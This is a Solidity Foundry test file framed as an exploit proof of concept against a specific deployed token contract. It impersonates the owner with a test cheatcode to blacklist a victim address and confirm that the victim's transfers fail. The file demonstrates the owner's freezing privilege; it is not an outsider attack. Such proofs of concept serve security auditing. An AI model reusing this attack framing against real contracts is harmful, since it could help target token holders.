// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITokenTool {
    function owner() external view returns (address);
    function multipleBotlistAddress(address[] calldata accounts, bool excluded) external;
    function _isBlacklisted(address account) external view returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);

    ITokenTool target;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ITokenTool(TARGET);
        victim = address(0xDEadBeEF1234567890DeaDbEef1234567890Dead);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner address
        address owner = target.owner();
        vm.label(owner, "Contract Owner");
        vm.label(victim, "Victim Address");

        // Impersonate the owner and blacklist the victim
        vm.startPrank(owner);
        address[] memory victims = new address[](1);
        victims[0] = victim;
        target.multipleBotlistAddress(victims, true);
        vm.stopPrank();

        // Verify the victim is now blacklisted (oracle check)
        assertEq(target._isBlacklisted(victim), true, "Victim should be blacklisted");

        // Additional verification: try to transfer from victim (should revert)
        vm.prank(victim);
        vm.expectRevert("Blacklisted address");
        target.transfer(address(0x1111), 1000);
        assertEq(target._isBlacklisted(victim), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

